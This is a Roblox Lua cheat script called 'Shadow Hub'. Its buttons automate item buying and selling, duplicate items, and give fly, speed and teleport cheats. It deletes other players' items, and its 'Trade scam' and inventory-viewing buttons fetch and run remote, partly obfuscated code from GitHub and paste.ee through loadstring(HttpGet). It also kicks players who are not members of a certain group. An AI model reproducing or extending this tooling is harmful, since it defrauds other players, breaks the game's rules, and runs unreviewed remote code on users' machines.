
local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/sol"))()

--[[SolarisLib:New({
  Name - Title of the UI <string>
  FolderToSave - Name of the folder where the UI files will be stored <string>
})]]




local win = SolarisLib:New({
  Name = "Shadow Hub",
  FolderToSave = "ShadowHubstuf"
})

--win:Tab(title <string>)
local tab = win:Tab("Tab 1")


--tab:Section(title <string>)
local sec = tab:Section("Elements")


--sec:Button(title <string>, callback <function>)








sec:Textbox("Enter Item name", true, function(t)
_G.customabuy = t
local players = game:GetService("Players")
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "SUCESS!";
    Text = "Item Selected , " .. _G.customabuy;
    Icon = "rbxassetid://11157772247";
    Duration = 5
})
end)

sec:Bind("Bind to buy", Enum.KeyCode.F, false, "BindNormal", function()
  	game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(_G.customabuy)
end)


sec:Toggle("Auto buy", false,"Toggle", function(t)
 if t then
            _G.on = true
            
            while _G.on == true do
                wait()
            
            wait()
          
		game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(_G.customabuy)
            
            wait()
            
                end
                else
            _G.on = false
                    
                end
end)

sec:Toggle("Auto Sell", false,"Toggle", function(t)
 if t then
            _G.on = true
            
            while _G.on == true do
                wait()
            
            wait()
        
		game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer(_G.customabuy)  
		wait()
		game:GetService("ReplicatedStorage").RemoteEvents.Sell:FireServer(_G.customabuy)

            
            wait()
            
                end
                else
            _G.on = false
                    
                end
            end)


sec:Toggle("Auto Drop", false,"Toggle", function(t)
 if t then
            _G.on = true
            
            while _G.on == true do
                wait()
            
            wait()
        
		game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer(_G.customabuy)  
		wait()
		game:GetService("ReplicatedStorage").RemoteEvents.Drop:FireServer(_G.customabuy)

            
            wait()
            
                end
                else
            _G.on = false
                    
                end
            end)


sec:Toggle("Auto Equp", false,"Toggle", function(t)
 if t then
            _G.on = true
            
            while _G.on == true do
                wait()
            
            wait()
        
		game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer(_G.customabuy)  
		

            
            wait()
            
                end
                else
            _G.on = false
                    
                end
            end)

sec:Toggle("Auto jump", false,"Toggle", function(t)
 if t then
            _G.on = true
            
            while _G.on == true do
                wait()
            
            wait()
        
game:GetService("ReplicatedStorage").RemoteEvents.Jumped:FireServer()		

            
            wait()
            
                end
                else
            _G.on = false
                    
                end
            end)



sec:Button("Nova Anti Reap", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/darckgames0103/ANTINOVA/main/README.md"))()
  SolarisLib:Notification("Shadow Hub", "Voce escolheu novo anti reap")
end)



sec:Button("Dupe", function()
    
while true do
    wait(.00000000000000000000000000000000000000000000001)
game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer("Piano")
end
  

  SolarisLib:Notification("Shadow Hub", "started wait 3 min")
end)


--[[
toggle:Set(state <boolean>)
]]

--sec:Slider(title <string>,default <number>,max <number>,minimum <number>,increment <number>, flag <string>, callback <function>)
local slider = sec:Slider("Velocity", 16,1000,0,2.5,"Slider", function(t)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = t
end)






sec:Textbox("buy custom", true, function(t)
_G.custombuy = t
end)
sec:Textbox("buy Custom Number", true, function(t)
for i = 1,t do
		wait()
		game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer(_G.custombuy)

	end
end)

sec:Textbox("buy the banana", true, function(t)
 for i = 1,t do
		wait(0.01)
		game:GetService("ReplicatedStorage").RemoteEvents.BuyItemCash:FireServer("The banana")
	end
end)

sec:Textbox("Drop Custom Item (x15)", true, function(txt)
_G.dropcustom = txt
	for i = 1,15 do
		game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer(_G.dropcustom)
		wait(0.35)
		game:GetService("ReplicatedStorage").RemoteEvents.Drop:FireServer(_G.dropcustom)
		wait(0.35)
	end
end)


sec:Button("Night Mode ", function()
local Info = TweenInfo.new(3, Enum.EasingStyle.Exponential)
	if game:GetService("Players").LocalPlayer:GetAttribute("IsDay") then
		game:GetService("TweenService"):Create(game:GetService("Lighting"), Info, {ClockTime = 12}):Play()
		game:GetService("Players").LocalPlayer:SetAttribute("IsDay", false)
	else
		game:GetService("TweenService"):Create(game:GetService("Lighting"), Info, {ClockTime = 0}):Play()
		game:GetService("Players").LocalPlayer:SetAttribute("IsDay", true)
	end

  
end)

sec:Button("Inf Jump ", function()
_G.infinjump = true
	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
		end
	end)
end)

sec:Button("G to Fly ", function()



local players = game:GetService("Players")
	local lp = players.LocalPlayer
	local Mouses = lp:GetMouse()
	mouse = Mouses
	local workspace = game.Workspace
	function sFLY(vfly)
		FLYING = false
		speedofthefly = 1.5
		speedofthevfly = 1
		while not lp or not lp.Character or not lp.Character:FindFirstChild('HumanoidRootPart') or not lp.Character:FindFirstChild('Humanoid') or not mouse do
			wait()
		end 
		local T = lp.Character.HumanoidRootPart
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0
		local function FLY()
			FLYING = true
			local BG = Instance.new('BodyGyro', T)
			local BV = Instance.new('BodyVelocity', T)
			BG.P = 9e4
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
				while FLYING do
					if not vfly then
						lp.Character:FindFirstChild("Humanoid").PlatformStand = true
					end
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
					wait()
				end
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:destroy()
				BV:destroy()
				lp.Character.Humanoid.PlatformStand = false
			end)
		end
		mouse.KeyDown:connect(function(KEY)
			if KEY:lower() == 'w' then
				if vfly then
					CONTROL.F = speedofthevfly
				else
					CONTROL.F = speedofthefly
				end
			elseif KEY:lower() == 's' then
				if vfly then
					CONTROL.B = - speedofthevfly
				else
					CONTROL.B = - speedofthefly
				end
			elseif KEY:lower() == 'a' then
				if vfly then
					CONTROL.L = - speedofthevfly
				else
					CONTROL.L = - speedofthefly
				end
			elseif KEY:lower() == 'd' then
				if vfly then
					CONTROL.R = speedofthevfly
				else
					CONTROL.R = speedofthefly
				end
			elseif KEY:lower() == 'y' then
				if vfly then
					CONTROL.Q = speedofthevfly*2
				else
					CONTROL.Q = speedofthefly*2
				end
			elseif KEY:lower() == 't' then
				if vfly then
					CONTROL.E = -speedofthevfly*2
				else
					CONTROL.E = -speedofthefly*2
				end
			end
		end)
		mouse.KeyUp:connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			elseif KEY:lower() == 'y' then
				CONTROL.Q = 0
			elseif KEY:lower() == 't' then
				CONTROL.E = 0
			end
		end)
		FLY()
	end

	mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'g' then
			if FLYING == false then
				sFLY()
			else
				FLYING = false
				lp.Character.Humanoid.PlatformStand = false
			end
		end
	end)
end)

sec:Button("Delet item (Key bind F)", function()
--[[
    script by Stan#8292
]]
getgenv().bind = "F" --keybind to delete popits near you
getgenv().invis = false --turns you invis so people cant see you deleting their stuff (resetting will uninvis you)
getgenv().on = true --setting this to false will stop the script
getgenv().IgnoredList = { --ignored people (script won't delete popits from these people)
    "Person1",
    "Person2",
    "Person3"
}
 
local domain = "paste.ee"
loadstring(game:HttpGet("https://"..domain.."/r/WFYpr/0"))()
end)

sec:Button("Trade  scam", function()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/a-website/SaintTradeScam/main/saintscamobfuscated.lua'),true))()
  SolarisLib:Notification("Shadow Hub", "Você escolheu new cracked Trade scam")
end)

sec:Button("See others Inventory", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/cracked13/HAHAHSDWAHA/main/README.md"))()

end)

sec:Textbox("Player Name Here", true, function(t)
_G.tpPlayer = t
end)


sec:Button("Click here to tp", function()
local p1 = game.Players.LocalPlayer.Character.HumanoidRootPart
local p2 = _G.tpPlayer
local pos = p1.CFrame

p1.CFrame = game.Players[p2].Character.HumanoidRootPart.CFrame

end)


sec:Textbox("Fps cap = 60", true, function(Value)
 setfpscap(tonumber(Value))
 end)
 

sec:Button("Xray", function()
game.Players.localPlayer.XRay.Value = true
end)

sec:Button("Scam v5 ", function()
--//By Shield Scripts
--[[
What does this do? It makes some items look really weird.
How to use?
1- Equip a random item.
2- Execute.

If it didnt work, repeat with another item.
]]--
for _,c in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	if c:IsA("Tool") then
		for _,c2 in pairs(c:GetDescendants()) do
			if c2.Name == "Mesh" then
				c2:Destroy()
			end
		end
	end
end
end)

sec:Textbox("Add Rainbow banana", true, function(t)
_G.Scamv5 = t
end)


sec:Button("scam v5 custom ", function()
game:GetService("ReplicatedStorage").RemoteEvents.Equip:FireServer(_G.Scamv5)
wait(1)
--//By Shield Scripts
--[[
What does this do? It makes some items look really weird.
How to use?
1- Equip a random item.
2- Execute.

If it didnt work, repeat with another item.
]]--
for _,c in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
	if c:IsA("Tool") then
		for _,c2 in pairs(c:GetDescendants()) do
			if c2.Name == "Mesh" then
				c2:Destroy()
			end
		end
	end
end
end)

sec:Button("safe zone", function()
                                                                                                                                                                                                                                            local plr = game.Players
                                                                                                                                                                                                                                                                                local lplr = plr.LocalPlayer
                                                                                                                                                                                                                                                                                local lchar = lplr.Character
                                                                                                                                                                                                                                                                                local HRP = lchar.HumanoidRootPart
                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                HRP.CFrame = CFrame.new(-100, 100, -10000)
                                                                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                                                                local C = Instance.new("Part")
                                                                                                                                                                                                                                                                                C.Parent = workspace                                                                                                                                                                                                                                                  
                                                                                                                                                                                                                                                                                C.CFrame = CFrame.new(-101, 50, -10000)
                                                                                                                                                                                                                                                                                C.Size = Vector3.new(100000000, 100, 10000000)                                                                                                                                                                                                                                                                                C.Anchored = true
                                                                                                                                                                                                                                                                                end)









        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
        
        for _, Player in ipairs(game:GetService("Players"):GetPlayers()) do
  if not Player:IsInGroup(14428241) then  -- replace 1 with your group id                  
      Player:Kick("Join on Group or no script acess, Copied to your Clipboard.");
      setclipboard("https://web.roblox.com/groups/14428241/shadow-grupo#!/about")
   end
end
